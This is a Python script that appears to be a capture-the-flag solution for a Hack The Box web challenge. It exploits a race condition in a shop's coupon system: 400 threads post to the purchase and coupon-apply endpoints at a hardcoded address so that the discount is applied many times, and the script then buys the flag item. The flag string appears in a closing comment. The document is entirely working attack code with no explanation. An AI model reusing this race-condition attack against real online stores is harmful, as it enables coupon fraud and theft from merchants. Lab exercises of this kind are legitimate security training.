import threading
from requests.sessions import Session
req = Session()


URL1 = 'http://178.62.74.50:32678/api/purchase'
URL2 = 'http://178.62.74.50:32678/api/coupons/apply'
data1 = {"item":"A1"}
data2 = {"coupon_code": "HTB_100"}
flag = {"item":"C8"}

def getSess():
    data1 = {"item":"A1"}
    r = req.post(URL1, json=data1)
    cookies = {"session": r.cookies["session"]}
    return cookies


def race(cookie):
    try:
        r = req.post(URL1, json=data1)
        r = req.post(URL2, json=data2)
        print(r.text)
    except:
        pass

def getFlag():
    r = req.post(URL1, json=flag)
    print(r.text)


if __name__ == "__main__":
    cookies = getSess()
    
    threads = []
    num_threads = 400

    for i in range(num_threads):
        threads.append(threading.Thread(target=race, args=(cookies,)))

    for thread in threads:
        thread.start()
        
    for thread in threads:
        thread.join()

    getFlag()

# "HTB{r4c3_w3b_d3f34t_c0nsum3r1sm}